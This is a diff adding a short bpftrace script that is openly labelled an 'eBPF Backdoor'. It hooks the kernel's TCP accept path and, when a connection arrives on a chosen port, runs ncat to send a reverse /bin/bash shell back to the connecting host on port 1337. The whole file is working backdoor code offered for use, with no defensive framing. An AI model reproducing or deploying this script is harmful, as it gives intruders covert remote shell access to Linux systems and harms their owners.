@@ -1,0 +1,29 @@
+#include <net/sock.h>
+
+BEGIN
+{
+  printf("eBPF Backdoor. Hit Ctrl-C to end.\n");
+  printf("Allowed source port: %u\n", $1);
+}
+
+kretprobe:inet_csk_accept
+{
+  $sk = (struct sock *)retval;
+  $inet_family = $sk->__sk_common.skc_family;
+  if ($inet_family != AF_INET) {
+    return;
+  }
+    
+  $dport = $sk->__sk_common.skc_dport;
+  // Destination port is big endian, it must be converted to little endian. From version 0.15 bpftrace support bswap (like htonl)
+  $src_port = (( $dport  >> 8) |  (( $dport << 8) & 0x00FF00));
+
+  if ($src_port != $1) {
+    return;
+  }
+
+  $daddr = ntop($sk->__sk_common.skc_daddr);
+  time("%H:%M:%S ");
+  printf("Got connection from %s on allowed port\n", $daddr);
+  system("ncat %s 1337 -e /bin/bash\n", $daddr)
+}
